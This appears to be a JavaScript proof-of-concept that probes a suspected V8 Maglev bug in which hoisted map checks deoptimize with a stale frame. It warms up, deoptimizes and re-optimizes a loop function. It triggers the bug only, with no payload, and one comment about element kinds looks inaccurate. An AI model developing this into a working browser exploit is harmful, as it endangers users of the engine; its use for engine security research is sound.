// PoC: Maglev CheckMaps Hoisting with Stale Deopt Frame
// Target: maglev-post-hoc-optimizations-processors.h lines 260-284
//
// When CheckMaps is hoisted out of a loop, the deopt frame is taken from
// the CheckpointedJump's eager_deopt_info. This frame represents pre-loop
// state, not the state at the original check location.

function hoistDeoptBug(arr, n) {
  let sum = 0;
  let factor = 1;
  
  for (let i = 0; i < n; i++) {
    // These operations modify the interpreter frame state
    factor = factor * 2;
    sum += factor;
    
    // CheckMaps on arr gets hoisted to before the loop
    // But the deopt frame will have pre-loop values of sum and factor
    let val = arr[i];
    sum += val;
  }
  
  return sum;
}

// Phase 1: Warmup with consistent types
let monomorphicArr = [1.1, 2.2, 3.3, 4.4, 5.5];
for (let i = 0; i < 50000; i++) {
  hoistDeoptBug(monomorphicArr, 5);
}

// Phase 2: Trigger deopt with map transition
// The CheckMaps was hoisted, so deopt happens with wrong frame
let polymorphicArr = [1.1, 2.2, 3.3, 4.4, 5.5];
polymorphicArr[2] = "string"; // Transition to HOLEY_ELEMENTS

let result = hoistDeoptBug(polymorphicArr, 5);
console.log("Result after deopt: " + result);

// Phase 3: Verify the function still works correctly after re-optimization
monomorphicArr = [10.1, 20.2, 30.3, 40.4, 50.5];
for (let i = 0; i < 50000; i++) {
  let r = hoistDeoptBug(monomorphicArr, 5);
  if (isNaN(r)) {
    console.log("BUG: NaN result after re-optimization at iteration " + i);
    break;
  }
}

console.log("Hoist deopt test completed");
